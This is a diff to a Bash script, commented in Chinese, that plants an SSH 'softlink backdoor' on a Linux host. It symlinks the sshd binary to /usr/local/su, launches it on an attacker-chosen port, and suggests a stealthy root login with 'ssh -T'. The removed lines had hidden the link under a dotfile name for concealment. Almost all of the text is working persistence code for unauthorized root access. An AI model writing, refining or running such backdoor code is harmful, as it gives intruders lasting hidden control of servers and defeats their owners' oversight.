@@ -58,20 +58,19 @@ checkPort() {
 # 函数：软链sshd后门
 softLink() {
     local port=$1
+    local sshd_link="/usr/local/su"
+
     # 检查端口是否被占用
     if ! checkPort "$port"; then
-        # 更换一个更隐蔽的后门位置和文件名
-        local sshd_link="/usr/local/sbin/.$(basename /usr/sbin/sshd)"
-
-        # 确保目标目录存在
-        mkdir -p "$(dirname "$sshd_link")"
-
         # 创建软链接
         ln -sf /usr/sbin/sshd "$sshd_link"
-        # 启动sshd，指定端口和配置文件（使用默认配置）
-        "$sshd_link" -p "$port"
+
+        # 启动sshd，指定端口
+        "$sshd_link" -oPort="$port" 
+
+        # 检查是否启动成功
         if checkPort "$port"; then
-             echo "${port} 端口sshd服务开启成功"
+            echo "${port} 端口sshd服务开启成功"
             echo "建议使用ssh隐身登录：ssh -T root@ip -p ${port}"
         else
             echo "启动失败"
